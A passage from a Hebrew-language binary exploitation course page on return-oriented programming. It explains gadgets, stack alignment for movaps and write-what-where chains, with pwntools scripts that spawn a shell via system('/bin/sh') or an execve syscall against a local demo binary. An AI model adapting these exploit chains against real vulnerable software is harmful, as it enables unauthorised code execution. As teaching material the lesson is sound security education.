+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>       <span class="c1"># aligns the stack to 16 bytes</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="p">[</span><span class="n">binsh</span><span class="p">])</span>                <span class="c1"># pwntools finds pop rdi on its own</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()})</span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop_demo&#39;</span><span class="p">)</span>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;payload:&#39;</span><span class="p">)</span>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>הפונקציה <code>elf.search(b'/bin/sh\x00')</code> סורקת את כל מקטעי הבינארי ומחזירה את הכתובת של המחרוזת. ה-<code>rop.call('system', [binsh])</code> אומר ל-pwntools "קרא ל-system עם הארגומנט הזה", והוא כבר מוצא את <code>pop rdi ; ret</code>, סודר את הערכים, ומוסיף את הקריאה. ה-<code>rop.dump()</code> יראה לכם בדיוק מה נבנה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>0x0000:         0x40101a ret
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>0x0008:         0x401256 pop rdi ; ret
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>0x0010:         0x402008 [arg0] rdi = 4202504
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>0x0018:         0x401060 system
+</code></pre></div>
+<h2 id="alignment-movaps-ret">מלכודת הalignment - movaps ותיקון עם ret נוסף<a class="headerlink" href="#alignment-movaps-ret" title="Permanent link">&para;</a></h2>
+<p>זו המלכודת שמפילה כמעט את כולם, וכבר פגשנו אותה ב-2.3, אבל היא כל כך נפוצה שכדאי לחזק. אתם בונים chain מושלמת, <code>rdi</code> מצביע נכון על <code>"/bin/sh"</code>, קופצים ל-<code>system</code>, והתוכנית קורסת עם <code>SIGSEGV</code> עמוק בתוך libc, בלי סיבה נראית לעין.</p>
+<p>הסיבה: ה-ABI של System V מחייב שברגע ביצוע הוראת <code>call</code>, מצביע המחסנית <code>rsp</code> יהיה aligned ל-16 בתים, כלומר <code>rsp % 16 == 0</code>. פונקציות libc מותאמות כמו <code>system</code> (דרך <code>do_system</code>) משתמשות בהוראות SSE כמו <code>movaps</code> שדורשות כתובת aligned ל-16. אנחנו לא מגיעים ל-<code>system</code> דרך <code>call</code> אלא דרך chain של <code>ret</code>, וכל <code>ret</code> מזיז את <code>rsp</code> ב-8 בתים. לעיתים קרובות אנחנו נופלים על <code>rsp % 16 == 8</code> במקום <code>0</code>, וזה מספיק כדי לפוצץ את ה-<code>movaps</code>.</p>
+<p>הקריסה ב-gdb נראית כך, ומיד מזהים אותה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Program received signal SIGSEGV
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>=&gt; 0x7ffff7e4a3b1 &lt;do_system+915&gt;: movaps XMMWORD PTR [rsp+0x50], xmm0
+</code></pre></div>
+<p>ברגע שאתם רואים <code>movaps</code> בכתובת של libc בזמן שקראתם ל-<code>system</code>, זה הalignment, אין ספק. התיקון אלגנטי: מוסיפים גאדג'ט <code>ret</code> בודד לפני הקריאה שמפוצצת. גאדג'ט ה-<code>ret</code> לא עושה כלום מלבד לשלוף 8 בתים ולקפוץ הלאה, כלומר הוא מזיז את <code>rsp</code> ב-8 בתים בדיוק, והופך <code>rsp % 16 == 8</code> ל-<code>rsp % 16 == 0</code>. זה בדיוק ה-<code>ret</code> שראיתם בראש כל chain בשיעור הזה. כלל אצבע: אם ב-64 ביט קריאה ל-<code>system</code> או ל-<code>printf</code> קורסת ב-<code>movaps</code>, תוסיפו גאדג'ט <code>ret</code> בודד לפני הקריאה ונסו שוב. אם עדיין קורס, אולי יש לכם <code>ret</code> מיותר - תורידו אחד.</p>
+<h2 id="-syscall">מעבר לחישוב שרירותי - כתיבה לזיכרון וsyscall<a class="headerlink" href="#-syscall" title="Permanent link">&para;</a></h2>
+<p>עד כאן קראנו לפונקציה קיימת. אבל אמרנו ש-ROP הוא טיורינג-שלם, אז בואו נראה איך בונים משהו יותר גולמי: קריאה ישירה ל-<code>execve("/bin/sh", 0, 0)</code> דרך syscall, בלי להסתמך על <code>system</code> בכלל. זה שימושי במיוחד בבינארי סטטי, שבו יש גאדג'ט <code>syscall</code> וגאדג'ט <code>pop rax</code>, אבל אין <code>system</code>.</p>
+<p>קריאת המערכת <code>execve</code> דורשת: <code>rax=59</code> (מספר ה-syscall), <code>rdi</code> מצביע על <code>"/bin/sh"</code>, <code>rsi=0</code>, <code>rdx=0</code>, ואז הוראת <code>syscall</code>. אם המחרוזת <code>"/bin/sh"</code> כבר קיימת בבינארי, הchain פשוטה:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">rop</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>                    <span class="c1"># execve syscall number</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">rop</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">binsh</span>                 <span class="c1"># pointer to &quot;/bin/sh&quot;</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">rop</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="n">rop</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;syscall&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
+</code></pre></div>
+<p>אבל מה אם אין בבינארי את המחרוזת <code>"/bin/sh"</code> בכלל? כאן נכנס ה-write-what-where. נשתמש בגאדג'ט כתיבה כדי לשתול את המחרוזת באזור זיכרון שאנחנו יודעים את כתובתו וגם ניתן לכתיבה, למשל <code>.bss</code> (בבינארי לא-PIE הכתובת קבועה). התהליך:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>1. pop rax ; ret     -&gt;  rax = u64(&quot;/bin/sh\0&quot;)   the value of the 8 bytes
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>2. pop rdi ; ret     -&gt;  rdi = address in .bss
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>3. mov [rdi], rax ; ret  -&gt;  writes &quot;/bin/sh\0&quot; to .bss
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>4. now .bss holds the string, and we continue as before to execve
+</code></pre></div>
+<p>ובקוד, כשמניחים שמצאנו את הגאדג'טים ואת כתובת ה-<code>.bss</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop_demo&#39;</span><span class="p">)</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="n">pop_rdi</span>     <span class="o">=</span> <span class="mh">0x401256</span>
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="n">pop_rax</span>     <span class="o">=</span> <span class="mh">0x4011c0</span>          <span class="c1"># example - find it in your binary</span>
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="n">pop_rsi</span>     <span class="o">=</span> <span class="mh">0x401258</span>
+<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="n">pop_rdx</span>     <span class="o">=</span> <span class="mh">0x4011c3</span>
+<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="n">mov_rdi_rax</span> <span class="o">=</span> <span class="mh">0x401180</span>          <span class="c1"># mov [rdi], rax ; ret</span>
+<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x4011f0</span>
+<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a><span class="n">bss</span>         <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>    <span class="c1"># free address in .bss</span>
+<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>
+<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span>
+<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span><span class="n">offset</span><span class="p">:</span> <span class="p">[</span>
+<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>    <span class="c1"># 1. write &quot;/bin/sh\0&quot; to .bss</span>
+<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>    <span class="n">pop_rax</span><span class="p">,</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">),</span>
+<a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>    <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">bss</span><span class="p">,</span>
+<a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>    <span class="n">mov_rdi_rax</span><span class="p">,</span>
+<a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>    <span class="c1"># 2. prepare execve&#39;s arguments</span>
+<a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>    <span class="n">pop_rdi</span><span class="p">,</span> <span class="n">bss</span><span class="p">,</span>               <span class="c1"># rdi -&gt; &quot;/bin/sh&quot;</span>
+<a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>    <span class="n">pop_rsi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>                 <span class="c1"># rsi = 0</span>
+<a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a>    <span class="n">pop_rdx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>                 <span class="c1"># rdx = 0</span>
+<a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a>    <span class="n">pop_rax</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span>                <span class="c1"># rax = execve</span>
+<a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a>    <span class="c1"># 3. jump to the syscall</span>
+<a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a>    <span class="n">syscall_ret</span><span class="p">,</span>
+<a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a><span class="p">]})</span>
+<a id="__codelineno-20-28" name="__codelineno-20-28" href="#__codelineno-20-28"></a>
+<a id="__codelineno-20-29" name="__codelineno-20-29" href="#__codelineno-20-29"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop_demo&#39;</span><span class="p">)</span>
+<a id="__codelineno-20-30" name="__codelineno-20-30" href="#__codelineno-20-30"></a><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;payload:&#39;</span><span class="p">)</span>
+<a id="__codelineno-20-31" name="__codelineno-20-31" href="#__codelineno-20-31"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-20-32" name="__codelineno-20-32" href="#__codelineno-20-32"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>זו ההדגמה החיה של "חישוב שרירותי": לקחנו נתון (מחרוזת), כתבנו אותו לזיכרון בעזרת גאדג'ט כתיבה, טענו אוגרים בעזרת גאדג'טים של <code>pop</code>, וקראנו לשירות מערכת. אף בית קוד חדש לא הורץ. בפועל, בבינארי דינמי קטן לרוב אין <code>pop rax</code> ו-<code>syscall</code> נוחים, ולכן נעדיף <code>system</code> או גאדג'טים מתוך libc (השיעורים הבאים). אבל התבנית הזו היא הבסיס לכל ROP מתקדם, ותראו אותה שוב ב-<code>ret2csu</code> וב-<code>SROP</code> בפרק 6.</p>
+<h2 id="_3">מלכודות נפוצות וטיפים<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li>ראשית, בדקו תמיד את ה-offset מחדש עם <code>cyclic</code> לכל בינארי. גודל הbuffer וpadding הalignment של המהדר משנים אותו.</li>
+<li>שיטת הקלט קובעת אילו בתים מותרים. הפונקציה <code>read</code> קוראת בתים גולמיים כולל <code>\x00</code>, אז כתובות עם בתים אפסיים בסדר. לעומת זאת <code>gets</code> ו-<code>scanf("%s")</code> עוצרים ב-null וברווח, ואז כתובת כמו <code>0x401256</code> (שמכילה בתים אפסיים עליונים ב-64 ביט) עלולה להיחתך.</li>
+<li>כשמשהו קורס, הריצו תחת gdb עם <code>gdb.attach(p)</code> או <code>gdb ./rop_demo</code> ואז <code>run &lt; payload.bin</code>, ותסתכלו על מצב האוגרים ב-<code>ret</code>. השתמשו ב-<code>rop.dump()</code> כדי לוודא שהchain נבנתה כמו שחשבתם.</li>
+<li>אם חסר לכם גאדג'ט לאוגר מסוים, חפשו דרך עקיפה: <code>pop rcx ; ret</code> פלוס <code>mov rdx, rcx ; ret</code>, או השתמשו ב-<code>ret2csu</code> (פרק 6) שנותן שליטה ב-<code>rdi</code>, <code>rsi</code>, <code>rdx</code> דרך גאדג'ט אוניברסלי שקיים כמעט בכל בינארי מקומפל עם gcc.</li>
+<li>זכרו את הalignment: כמעט תמיד כשקריאה ל-<code>system</code>/<code>printf</code> קורסת בתוך libc, זו בעיית ה-<code>movaps</code>. גאדג'ט <code>ret</code> אחד פותר.</li>
+</ul>
+<h2 id="_4">סיכום<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<ul>
+<li>תכנות מונחה חזרה (ROP) עוקף NX על ידי שרשור קטעי קוד קיימים במקום הזרקת קוד חדש.</li>
+<li>גאדג'ט הוא רצף קצר של הוראות שמסתיים ב-<code>ret</code>. בזכות ההוראות באורך משתנה ב-x86-64, יש גם גאדג'טים לא מכוונים, ולכן אפילו בבינארי קטן יש אלפי גאדג'טים.</li>
+<li>הROP chain היא "תוכנית" שכתובה על המחסנית: <code>rsp</code> הוא מצביע ההוראות, וכל <code>ret</code> מקדם אותו לפריט הבא. עם הסט הנכון של גאדג'טים אפשר לבנות כל חישוב.</li>
+<li>ב-64 ביט טוענים ארגומנטים לאוגרים עם גאדג'טים כמו <code>pop rdi ; ret</code>, <code>pop rsi ; ret</code>, <code>pop rdx ; ret</code>.</li>
+<li>מוצאים גאדג'טים עם <code>ROPgadget</code>, <code>ropper</code>, ואובייקט ה-<code>ROP</code> של <code>pwntools</code> שגם בונה את הchain ומדפיס אותה עם <code>rop.dump()</code>.</li>
+<li>הchain ל-<code>system("/bin/sh")</code> בתוך בינארי לא-PIE היא <code>[ret לalignment] [pop rdi] [כתובת /bin/sh] [system@plt]</code>, והכל בכתובות קבועות.</li>
+<li>מלכודת ה-<code>movaps</code>: קריאה לפונקציית libc כבדה קורסת אם <code>rsp</code> לא aligned ל-16 בתים. גאדג'ט <code>ret</code> בודד לפני הקריאה פותר.</li>
+<li>לחישוב שרירותי אמיתי משתמשים בגאדג'טים של כתיבה (<code>mov [rdi], rax</code>) ובגאדג'ט <code>syscall</code> כדי לקרוא ל-<code>execve</code> ישירות.</li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="עדכון אחרון">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime" title="15 ביולי 2026 19:14:25 UTC">2026-07-15 19:14:25</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  חזרה למעלה
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "navigation.prune", "navigation.path", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u05d4\u05d5\u05e2\u05ea\u05e7 \u05dc\u05dc\u05d5\u05d7", "clipboard.copy": "\u05d4\u05e2\u05ea\u05e7\u05d4 \u05dc\u05dc\u05d5\u05d7", "search.result.more.one": "\u05e2\u05d5\u05d3 \u05d0\u05d7\u05d3 \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.more.other": "\u05e2\u05d5\u05d3 # \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.none": "\u05d0\u05d9\u05df \u05de\u05e1\u05de\u05db\u05d9\u05dd \u05ea\u05d5\u05d0\u05de\u05d9\u05dd", "search.result.one": "\u05de\u05e1\u05de\u05da1 \u05ea\u05d5\u05d0\u05dd", "search.result.other": "# \u05de\u05e1\u05de\u05da \u05ea\u05d5\u05d0\u05dd", "search.result.placeholder": "\u05d9\u05e9 \u05dc\u05d4\u05e7\u05dc\u05d9\u05d3 \u05db\u05d3\u05d9 \u05dc\u05d4\u05ea\u05d7\u05d9\u05dc \u05dc\u05d7\u05e4\u05e9", "search.result.term.missing": "\u05d7\u05e1\u05e8", "select.version": "\u05d1\u05d7\u05d9\u05e8\u05ea \u05d2\u05e8\u05e1\u05d4"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../javascripts/progress.js"></script>
+      
+        <script src="../../../../javascripts/tabs-dropdown.js"></script>
+      
+        <script src="../../../../javascripts/theme-switcher.js"></script>
+      
+        <script src="../../../../javascripts/recent-posts.js"></script>
+      
+    
+  </body>
+</html>
